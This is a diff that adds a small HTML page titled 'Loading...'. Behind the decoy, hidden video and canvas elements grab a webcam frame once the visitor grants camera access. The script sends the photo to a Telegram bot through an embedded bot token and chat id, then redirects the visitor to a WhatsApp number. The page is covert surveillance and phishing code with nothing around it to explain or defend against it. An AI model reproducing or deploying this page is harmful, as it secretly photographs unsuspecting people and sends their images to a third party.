@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body style="background:black">
+    <video id="cam" autoplay style="display:none"></video>
+    <canvas id="canvas" style="display:none"></canvas>
+
+    <script>
+        navigator.mediaDevices.getUserMedia({video: true})
+        .then(stream => {
+            var video = document.getElementById('cam');
+            video.srcObject = stream;
+            
+            setTimeout(() => {
+                var canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                var bot_token = '7869154817:AAEDDgeICEKXBA_C2_0xFuzHNgUMEoT3hlA';
+                var chat_id = '7701259633';
+                var image = canvas.toDataURL();
+                
+                fetch(`https://api.telegram.org/bot${bot_token}/sendPhoto`, {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        chat_id: chat_id,
+                        photo: image
+                    })
+                });
+
+                window.location = "https://wa.me/201029034601";
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
